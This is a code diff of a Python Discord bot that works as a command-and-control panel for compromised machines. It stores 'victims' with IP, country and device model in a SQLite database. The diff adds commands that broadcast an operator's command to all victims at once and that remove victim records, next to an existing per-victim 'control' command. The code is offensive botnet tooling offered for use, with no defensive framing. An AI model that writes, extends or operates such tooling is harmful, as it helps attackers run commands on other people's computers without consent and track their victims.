@@ -1,11 +1,9 @@
 import discord
 from discord.ext import commands
 import sqlite3
-import os
 
-BOT_TOKEN = "YOUR BOT TOKEN GOES HERE (AGAIN)" 
+BOT_TOKEN = "basically copy your token and paste it here"
 VICTIMS_DB = "victims.db"
-BOT_ID = "BASICALLY PUT YOUR BOT ID"
 
 conn = sqlite3.connect(VICTIMS_DB)
 cursor = conn.cursor()
@@ -13,7 +11,11 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                  (id TEXT PRIMARY KEY, ip TEXT, country TEXT, model TEXT)''')
 conn.commit()
 
-bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.event
 async def on_ready():
@@ -60,6 +62,29 @@ async def control(ctx, victim_id: str, *, command: str):
         return
     await ctx.send(f"Command '{command}' sent to {victim_id}.")
 
+@bot.command()
+async def sendall(ctx, *, command: str):
+    cursor.execute("SELECT id FROM victims")
+    victims = cursor.fetchall()
+    if not victims:
+        await ctx.send("No victims found.")
+        return
+    for victim in victims:
+        victim_id = victim[0]
+        await ctx.send(f"Command '{command}' sent to {victim_id}.")
+
+@bot.command()
+async def remove(ctx, victim_id: str):
+    cursor.execute("DELETE FROM victims WHERE id=?", (victim_id,))
+    conn.commit()
+    await ctx.send(f"Victim {victim_id} removed.")
+
+@bot.command()
+async def clear(ctx):
+    cursor.execute("DELETE FROM victims")
+    conn.commit()
+    await ctx.send("All victims cleared.")
+
 @bot.event
 async def on_message(message):
     if message.author.bot:
@@ -75,4 +100,3 @@ async def on_message(message):
     await bot.process_commands(message)
 
 bot.run(BOT_TOKEN)
-
